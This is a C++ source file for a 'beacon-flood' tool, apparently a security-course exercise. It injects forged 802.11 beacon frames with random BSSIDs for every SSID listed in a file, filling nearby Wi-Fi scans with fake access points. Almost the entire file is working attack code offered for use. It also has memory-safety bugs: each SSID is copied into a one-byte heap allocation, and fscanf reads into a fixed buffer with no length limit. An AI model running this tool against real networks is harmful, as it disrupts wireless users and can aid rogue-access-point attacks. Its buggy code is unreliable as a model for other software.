#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <libnet.h>
#include <list>
#include <iostream>
#include <thread>
#include "beacon.h"

bool stop = false;

void usage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

typedef struct {
    char* dev_;
    const char* fname_;
} Param;

Param param  = {
    .dev_ = NULL,
    .fname_ = NULL,
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 3) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    param->fname_ = argv[2];
    return true;
}

void sendBeaconPkt(pcap_t* pcap, const char* ssid){
    char beaconpkt[500];
    int size = 0;

    RadiotapHdr radiotapHdr;
    radiotapHdr.setDefault();
    memcpy(beaconpkt, &radiotapHdr, sizeof(RadiotapHdr));
    size += sizeof(RadiotapHdr);

    uint32_t radiotapData;
    radiotapData = 0x00180002;
    memcpy(beaconpkt+size, &radiotapData, sizeof(radiotapData));
    size += sizeof(radiotapData);

    Dot11Hdr dot11Hdr;
    Mac ap;
    uint8_t r[6];
    for(int i=0;i<6;i++)
        r[i] = rand()&0xFF;
    memcpy(&ap,&r,sizeof(Mac));
    Mac station = Mac("00:00:00:00:00:00");
    dot11Hdr.setDefaultBeacon(ap, station);
    memcpy(beaconpkt+size, &dot11Hdr, sizeof(Dot11Hdr));
    size += sizeof (Dot11Hdr);

    BeaconFixedData fixedParm;
    fixedParm.setDefualt();
    memcpy(beaconpkt+size,&fixedParm, sizeof(BeaconFixedData));
    size += sizeof(BeaconFixedData);

    // TagParm - SSID
    TagParm tagParm;
    int len = strlen(ssid);
    tagParm.set(0x00, len);
    memcpy(beaconpkt+size, &tagParm, sizeof(TagParm));
    size += sizeof(TagParm);
    memcpy(beaconpkt+size, ssid, len);
    size += len;
    // TagParm - Supported rate
    tagParm.set(0x01, 0x04);
    uint32_t value2 = 0x968b8482;
    memcpy(beaconpkt+size, &tagParm, sizeof(TagParm));
    size += sizeof(TagParm);
    memcpy(beaconpkt+size, &value2, sizeof(value2));
    size += sizeof(value2);
    // TagParm - DS Parameter set
    tagParm.set(0x03, 0x01);
    uint8_t value3 = 0x01;
    memcpy(beaconpkt+size, &tagParm, sizeof(TagParm));
    size += sizeof(TagParm);
    memcpy(beaconpkt+size, &value3, sizeof(value3));
    size += sizeof(value3);
    // TagParm - CF Parameter set
    tagParm.set(0x04, 0x06);
    uint8_t value4[6] = {0x01, 0x02, 0x00, 0x00, 0x00, 0x00};
    memcpy(beaconpkt+size, &tagParm, sizeof(TagParm));
    size += sizeof(TagParm);
    memcpy(beaconpkt+size, &value4, tagParm.len);
    size += sizeof(value4);
    // TagParm - TIM
    tagParm.set(0x05, 0x04);
    uint32_t value5 = 0x00000100;
    memcpy(beaconpkt+size, &tagParm, sizeof(TagParm));
    size += sizeof(TagParm);
    memcpy(beaconpkt+size, &value5, tagParm.len);
    size += sizeof(value5);

    while(!stop){
//        std::cout << ssid << "[thread] send packet\n";
        int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&beaconpkt), size);
        if (send_res != 0)
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(pcap));
        std::this_thread::sleep_for(std::chrono::microseconds(102400));     // 102.4 msec
    }
}

// 콘솔 ctrl+c 입력시 인터럽트 발생 => 작업 중지 리스너
void setStop(int sig){
    signal(sig, SIG_IGN);
//    printf("stop!!\n");
    stop = true;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    // Get SSID from file
    FILE* fp = fopen(param.fname_, "r");
    if (fp == NULL){
        printf("File open error\n");
        return -1;
    }
    std::list<std::string> ssidList;
    char ssid[33];  // max 32
    while(true){
        fscanf(fp, "%s", ssid);
        if(feof(fp))
            break;
        ssidList.push_back(ssid);
    }

    signal(SIGINT, setStop);   // ctrl+c 인터럽트 시그널 콜백 설정

    std::list<std::thread> threadList;
    for(std::string& id: ssidList){
        char* ssid = new char;
        strcpy(ssid, id.c_str());
        threadList.push_back(std::thread(sendBeaconPkt, pcap, ssid));
    }
    for(auto& t: threadList){
        t.join();
    }
    printf("finish main\n");

    pcap_close(pcap);
    fclose(fp);
    return 0;
}
